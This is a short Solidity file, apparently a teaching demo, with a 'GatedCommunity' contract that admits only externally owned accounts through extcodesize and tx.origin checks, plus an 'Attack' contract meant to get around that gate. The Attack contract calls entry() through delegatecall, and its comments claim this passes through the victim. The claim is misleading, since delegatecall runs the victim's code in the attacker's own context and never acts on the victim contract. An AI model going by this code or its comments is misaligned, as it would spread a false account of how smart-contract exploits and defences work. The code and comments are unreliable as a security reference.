// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatedCommunity{
    // This gated-community only allows EOA to call it and no smart contract is allowed

    event MemberEntered(address indexed member);

    modifier onlyEOA {
        uint256 callerCodeSize;

        assembly{
            callerCodeSize := extcodesize(caller())
        }

        require(callerCodeSize == 0, "Only EOA is allowed");

        _;
    }

    modifier onlyEOA2 {
        require (tx.origin == msg.sender, "Only EOA is allowed");
        _;
    }

    function entry() public onlyEOA onlyEOA2{
        emit MemberEntered(msg.sender);
    }
}

contract Attack{

    function attack (address _gatedCommunityAddr) public {
        (bool success, ) = _gatedCommunityAddr.delegatecall(abi.encodeWithSignature("entry()"));
        // above code will passthrough the GatedCommunity eventhough it called by a Smart-Contract and msg.sender will be User
        // both msg.sender & tx.origin is also will be an USER's address not the address of this SmartContract
        require(success == true, "call to victim is failed");
    }
}